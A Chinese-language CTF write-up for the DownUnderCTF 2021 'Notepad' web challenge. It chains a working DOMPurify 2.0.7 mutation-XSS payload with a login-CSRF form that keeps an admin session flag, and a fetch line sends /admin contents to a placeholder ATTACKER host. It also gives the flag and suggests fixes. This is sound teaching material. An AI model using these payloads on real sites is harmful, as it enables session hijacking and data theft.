# DownUnderCTF 2021 - Notepad

## 题目简述

Notepad 在浏览器中用 Showdown 把笔记转成 HTML，再交给旧版 DOMPurify 2.0.7 清洗。管理员机器人拥有 `admin=1` 的会话，但报告接口允许它访问任意 URL；通过登录 CSRF 可在不清除管理员标记的情况下把该会话切换到攻击者账号，随后加载攻击者保存的 mutation XSS，读取 `/admin` 并外带 flag。

## 解题过程

### 准备攻击者账号与存储型 payload

先注册、登录一个普通账号。`POST /me` 接收 JSON 并原样把 `note` 保存到 Redis；查看页面时浏览器执行：

```javascript
markdown.innerHTML = DOMPurify.sanitize(
    converter.makeHtml(editor.value)
);
```

依赖版本为 DOMPurify 2.0.7。可使用利用 MathML、`mglyph`、`style` 和注释边界的 mutation XSS，使字符串在清洗阶段看似无害，但赋给 `innerHTML` 后由浏览器重新解析出带 `onerror` 的图片元素：

```html
a</p><math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img&Tab;src=1&Tab;onerror=eval(atob('BASE64_SCRIPT'));&gt;"><style>
```

其中 `BASE64_SCRIPT` 解码后执行：

```javascript
fetch('/admin', {credentials: 'include'})
  .then(response => response.text())
  .then(body => location = 'https://ATTACKER/' + btoa(body));
```

页面的 CSP 只有 `frame-ancestors 'none'`，没有限制脚本源或事件处理器，因而不能阻止 payload 执行。

### 用登录 CSRF 保留管理员标记

管理员机器人先通过内部 `/admin/marvin-login` 取得会话，session 同时支持：

```python
session['user'] = 'admin'
session['admin'] = 1
```

普通 `/login` 登录成功时只改写 `session['user']`，不会清除 `session['admin']`。此外，登录表单没有 CSRF Token，Cookie 配置为 `SameSite=None; Secure`。在攻击者服务器托管以下页面：

```html
<form action="https://CHALLENGE/login" method="POST">
  <input name="username" value="ATTACKER_USER">
  <input name="password" value="ATTACKER_PASSWORD">
</form>
<script>document.querySelector('form').submit()</script>
```

让普通账号通过 `/report` 报告这条外部 URL。机器人访问后自动向挑战站跨站提交攻击者凭据；原管理员 session Cookie 会随请求发送，登录逻辑把 `user` 切换成攻击者，却保留 `admin=1`。随后 302 跳转到 `/me`，正好加载攻击者预存的恶意笔记。

### 读取并外带 flag

浏览器对清洗结果重新构造 DOM 时触发 `onerror`，同源请求 `/admin`。该路由只检查：

```python
if session.get('admin') != 1:
    return "", 403
```

管理员标记仍在，故响应正文是 flag；脚本把正文 Base64 编码到接收端 URL 中。解码得到：

```text
DUCTF{ch4ining_c5rf_c4uses_cha0s_2045c24d}
```

## 方法总结

本题需要串联三种浏览器端缺陷：任意 URL 报告带来的跨站导航、无 CSRF 防护且不重置权限状态的登录流程、旧版 HTML 清洗器的 mutation XSS。单独修补其中一环都会破坏利用链；完整修复还应在身份切换时清空并重新生成会话、限制机器人可访问的 URL、升级并正确配置清洗器，并部署严格的 `script-src` CSP。
